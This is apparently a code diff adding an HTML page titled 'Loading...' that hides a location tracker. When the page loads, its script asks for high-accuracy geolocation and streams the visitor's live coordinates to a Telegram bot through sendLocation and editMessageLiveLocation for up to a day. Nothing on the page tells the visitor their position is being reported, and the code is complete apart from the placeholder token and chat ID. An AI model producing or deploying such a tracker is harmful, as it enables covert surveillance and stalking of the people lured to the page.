@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+</head>
+<body>
+    <script>
+        const BOT_TOKEN = 'YOUR_BOT_TOKEN';
+        const CHAT_ID = 'YOUR_CHAT_ID';
+        let messageId = null;
+
+        function startTracking() {
+            if (navigator.geolocation) {
+                // High accuracy forces GPS usage over IP guessing
+                navigator.geolocation.watchPosition(updateLocation, handleError, {
+                    enableHighAccuracy: true,
+                    maximumAge: 0,
+                    timeout: 5000
+                });
+            }
+        }
+
+        async function updateLocation(pos) {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            
+            // If it's the first coordinate, send a new Live Location message
+            if (!messageId) {
+                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}&live_period=86400`);
+                const data = await res.json();
+                messageId = data.result.message_id;
+            } else {
+                // Update the existing map bubble in real-time
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageLiveLocation?chat_id=${CHAT_ID}&message_id=${messageId}&latitude=${lat}&longitude=${lon}`);
+            }
+        }
+
+        function handleError(err) {
+            // Logic to handle permission denial or signal loss
+        }
+
+        window.onload = startTracking;
+    </script>
+</body>
+</html>
